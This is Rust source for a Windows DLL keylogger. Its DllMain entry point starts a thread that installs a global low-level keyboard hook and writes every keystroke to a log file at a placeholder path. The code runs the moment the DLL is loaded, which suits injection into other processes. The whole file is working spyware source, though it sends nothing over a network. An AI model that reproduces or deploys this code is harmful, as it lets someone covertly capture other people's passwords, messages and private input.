use std::{
    fs::File,
    io::{self, BufWriter, Write},
    os::raw::c_void,
    sync::{Arc, Mutex},
};
use windows::Win32::{
    Foundation::{GetLastError, HINSTANCE, HWND, LPARAM, LRESULT, WPARAM},
    System::Threading::{CreateThread, THREAD_CREATION_FLAGS},
    UI::{
        Input::KeyboardAndMouse::GetAsyncKeyState,
        WindowsAndMessaging::{
            CallNextHookEx, GetMessageA, SetWindowsHookExA, UnhookWindowsHookEx, KBDLLHOOKSTRUCT,
            MSG, WH_KEYBOARD_LL, WM_KEYDOWN,
        },
    },
};

const DLL_PROCESS_ATTACH: u32 = 1;
const THREAD_ERRO_CODE: u32 = 1;
const LOG_DESTINATION_PATH: &str = "yourPath";

static mut KEYBOARD_LOGGER: Option<Arc<KeyboardLogger>> = None;

struct KeyboardLogger {
    file: Arc<Mutex<BufWriter<File>>>,
}

impl KeyboardLogger {
    fn new(file_path: &str) -> io::Result<Self> {
        let file = File::create(file_path)?;
        Ok(KeyboardLogger {
            file: Arc::new(Mutex::new(BufWriter::new(file))),
        })
    }

    fn log_key(&self, vk_code: u8, shift_pressed: bool) {
        let mut file = self.file.lock().unwrap();
        let character = if shift_pressed {
            vk_code as char
        } else {
            vk_code.to_ascii_lowercase() as char
        };

        let _ = writeln!(file, "{}", character);
        let _ = file.flush();
    }
    fn log_error(&self, error_message: &str, error_code: u32) {
        let mut file = self.file.lock().unwrap();
        let _ = writeln!(file, "Error: {}, Code: {}", error_message, error_code);
        let _ = file.flush();
    }
    fn log_message(&self, message: &str) {
        let mut file = self.file.lock().unwrap();
        let _ = writeln!(file, "Message {}", message);
        let _ = file.flush();
    }
}

unsafe extern "system" fn keyboard_proc(n_code: i32, w_param: WPARAM, l_param: LPARAM) -> LRESULT {
    if n_code == 0 {
        let p = &*(l_param.0 as *const KBDLLHOOKSTRUCT);
        if w_param.0 == WM_KEYDOWN as usize {
            if let Some(ref logger) = KEYBOARD_LOGGER {
                let shift_pressed = GetAsyncKeyState(0x10) & 0x8000u16 as i16 != 0;
                logger.log_key(p.vkCode as u8, shift_pressed);
            }
        }
    }

    CallNextHookEx(None, n_code, w_param, l_param)
}

unsafe extern "system" fn my_thread_function(_: *mut c_void) -> u32 {
    let h_hook =
        match SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_proc), HINSTANCE::default(), 0) {
            Ok(h) => h,
            Err(_) => {
                let error_code = GetLastError();
                if let Some(ref logger) = KEYBOARD_LOGGER {
                    logger.log_error("Failed to set hook.", error_code.0);
                }
                return THREAD_ERRO_CODE;
            }
        };
    // run inifite loop
    let mut msg: MSG = MSG::default();
    while GetMessageA(&mut msg, HWND::default(), 0, 0).into() {}

    let _ = UnhookWindowsHookEx(h_hook);
    0
}

#[no_mangle]
pub extern "system" fn DllMain(_: HINSTANCE, fdw_reason: u32, _: *mut std::ffi::c_void) -> bool {
    match fdw_reason {
        DLL_PROCESS_ATTACH => unsafe {
            if KEYBOARD_LOGGER.is_none() {
                match KeyboardLogger::new(LOG_DESTINATION_PATH) {
                    Ok(logger) => {
                        KEYBOARD_LOGGER = Some(Arc::new(logger));
                    }
                    Err(e) => {
                        panic!("Failed to initialize keyboard logger: {}", e);
                    }
                }
            }
            let _ = CreateThread(
                None,
                0,
                Some(my_thread_function),
                None,
                THREAD_CREATION_FLAGS(0),
                None,
            );
        },
        _ => {}
    }
    true
}
